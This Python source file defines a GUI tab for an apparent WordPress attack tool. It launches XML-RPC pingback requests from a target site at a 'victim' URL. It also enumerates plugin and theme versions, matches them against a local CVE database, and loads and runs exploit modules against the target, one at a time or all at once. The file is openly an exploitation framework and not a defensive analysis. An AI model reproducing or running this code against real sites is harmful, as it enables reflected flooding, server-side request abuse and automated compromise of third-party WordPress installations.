ui/tabs_exploits.py

import customtkinter as ctk import os, threading, re, json, requests, importlib.util from tkinter import messagebox from urllib.parse import urljoin import xmlrpc.client

matched_exploits = []

def load_exploit_tab(tab): def run_pingback_exploit(): xmlrpc_url = exploit_target_entry.get().strip() victim_url = exploit_victim_entry.get().strip()

if not xmlrpc_url or not victim_url:
        messagebox.showerror("Error", "Fill in both target and victim URLs.")
        return

    exploit_output.delete("0.0", "end")
    exploit_output.insert("end", f"[*] Sending pingback from {xmlrpc_url} to {victim_url}\n")

    try:
        proxy = xmlrpc.client.ServerProxy(xmlrpc_url)
        result = proxy.pingback.ping(victim_url, xmlrpc_url)
        exploit_output.insert("end", f"[+] Pingback response: {result}\n")
    except xmlrpc.client.Fault as fault:
        exploit_output.insert("end", f"[-] Fault: {fault.faultString}\n")
    except Exception as e:
        exploit_output.insert("end", f"[!] Error: {e}\n")

def run_wp_asset_enum():
    url = exploit_target_entry.get().strip()
    if not url.startswith("http"):
        messagebox.showerror("Error", "Enter a valid WordPress URL.")
        return

    exploit_output.delete("0.0", "end")
    exploit_output.insert("end", f"[*] Scanning {url} for plugins and themes...\n")

    try:
        r = requests.get(url, timeout=10)
        html = r.text
        plugin_matches = re.findall(r'/wp-content/plugins/([a-zA-Z0-9-_]+)(/[^"\']*)?', html)
        theme_matches = re.findall(r'/wp-content/themes/([a-zA-Z0-9-_]+)(/[^"\']*)?', html)
        plugin_set = {m[0] for m in plugin_matches}
        theme_set = {m[0] for m in theme_matches}

        if plugin_set:
            exploit_output.insert("end", "\n[+] Plugins Found:\n")
            for plugin in plugin_set:
                version = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
                if version:
                    exploit_output.insert("end", f" - {plugin} (ver {version.group(1)})\n")
                else:
                    exploit_output.insert("end", f" - {plugin}\n")
        else:
            exploit_output.insert("end", "[-] No plugins found.\n")

        if theme_set:
            exploit_output.insert("end", "\n[+] Themes Found:\n")
            for theme in theme_set:
                version = re.search(rf'/wp-content/themes/{theme}.*?[?&]ver=([0-9\.]+)', html)
                if version:
                    exploit_output.insert("end", f" - {theme} (ver {version.group(1)})\n")
                else:
                    exploit_output.insert("end", f" - {theme}\n")
        else:
            exploit_output.insert("end", "[-] No themes found.\n")

    except Exception as e:
        exploit_output.insert("end", f"[!] Failed to scan: {e}\n")

def match_vulnerabilities():
    global matched_exploits
    matched_exploits.clear()

    try:
        with open("cve_db.json", "r") as f:
            vuln_db = json.load(f)
    except Exception as e:
        exploit_output.insert("end", f"[!] Could not load CVE DB: {e}\n")
        return

    url = exploit_target_entry.get().strip()
    try:
        r = requests.get(url, timeout=10)
        html = r.text
    except Exception as e:
        exploit_output.insert("end", f"[!] Failed to fetch target HTML: {e}\n")
        return

    for plugin in vuln_db:
        if f"/wp-content/plugins/{plugin}" in html:
            version_match = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
            if version_match:
                version = version_match.group(1)
                if version in vuln_db[plugin]:
                    vuln = vuln_db[plugin][version]
                    matched_exploits.append(vuln['exploit'])
                    exploit_output.insert("end", f"[+] {plugin} v{version} is VULNERABLE!\n")
                    exploit_output.insert("end", f"    - {vuln['cve']}: {vuln['desc']}\n")
                else:
                    exploit_output.insert("end", f"[-] {plugin} v{version} found — no vuln match.\n")
            else:
                exploit_output.insert("end", f"[*] {plugin} detected — version unknown.\n")

    if matched_exploits:
        exploit_selector.configure(values=matched_exploits)
        exploit_selector.set(matched_exploits[0])
    else:
        exploit_selector.set("None found")

def run_selected_exploit():
    selected_exploit = exploit_selector.get()
    target_url = exploit_target_entry.get().strip()

    if not selected_exploit or selected_exploit == "None found":
        messagebox.showerror("Error", "No exploit selected.")
        return

    module_path = os.path.join("exploits", f"{selected_exploit}.py")
    if not os.path.exists(module_path):
        exploit_output.insert("end", f"[!] Exploit module not found: {selected_exploit}\n")
        return

    try:
        spec = importlib.util.spec_from_file_location(selected_exploit, module_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        result = module.run(target_url)
        exploit_output.insert("end", f"[+] Exploit result:\n{result}\n")
    except Exception as e:
        exploit_output.insert("end", f"[!] Exploit failed: {e}\n")

def run_all_exploits():
    target_url = exploit_target_entry.get().strip()
    if not matched_exploits:
        messagebox.showwarning("No Exploits", "No matched exploits to run.")
        return

    exploit_output.insert("end", f"\n[*] Running {len(matched_exploits)} exploit(s) on {target_url}...\n")
    for exploit_name in matched_exploits:
        module_path = os.path.join("exploits", f"{exploit_name}.py")
        if not os.path.exists(module_path):
            exploit_output.insert("end", f"[!] Missing module: {exploit_name}\n")
            continue
        try:
            spec = importlib.util.spec_from_file_location(exploit_name, module_path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            result = module.run(target_url)
            exploit_output.insert("end", f"[+] {exploit_name} result:\n{result}\n")
        except Exception as e:
            exploit_output.insert("end", f"[!] {exploit_name} failed: {e}\n")
    exploit_output.insert("end", "[*] All exploits processed.\n")

ctk.CTkLabel(tab, text="Target XML-RPC URL").pack(pady=5)
exploit_target_entry = ctk.CTkEntry(tab, width=700)
exploit_target_entry.insert(0, "https://example.com/xmlrpc.php")
exploit_target_entry.pack()

ctk.CTkLabel(tab, text="Victim URL to Ping").pack(pady=5)
exploit_victim_entry = ctk.CTkEntry(tab, width=700)
exploit_victim_entry.insert(0, "http://victim.com")
exploit_victim_entry.pack()

ctk.CTkButton(tab, text="Launch Pingback Exploit", command=lambda: threading.Thread(target=run_pingback_exploit).start()).pack(pady=5)
ctk.CTkButton(tab, text="Scan Plugins & Themes", command=lambda: threading.Thread(target=run_wp_asset_enum).start()).pack(pady=5)
ctk.CTkButton(tab, text="Check for CVEs", command=lambda: threading.Thread(target=match_vulnerabilities).start()).pack(pady=5)

ctk.CTkLabel(tab, text="Available Exploits").pack(pady=5)
global exploit_selector
exploit_selector = ctk.CTkOptionMenu(tab, values=["None found"])
exploit_selector.pack()

ctk.CTkButton(tab, text="Run Selected Exploit", command=lambda: threading.Thread(target=run_selected_exploit).start()).pack(pady=5)
ctk.CTkButton(tab, text="Run All Exploits", fg_color="red", hover_color="darkred", command=lambda: threading.Thread(target=run_all_exploits).start()).pack(pady=5)

global exploit_output
exploit_output = ctk.CTkTextbox(tab, height=300, width=800)
exploit_output.pack(pady=5)

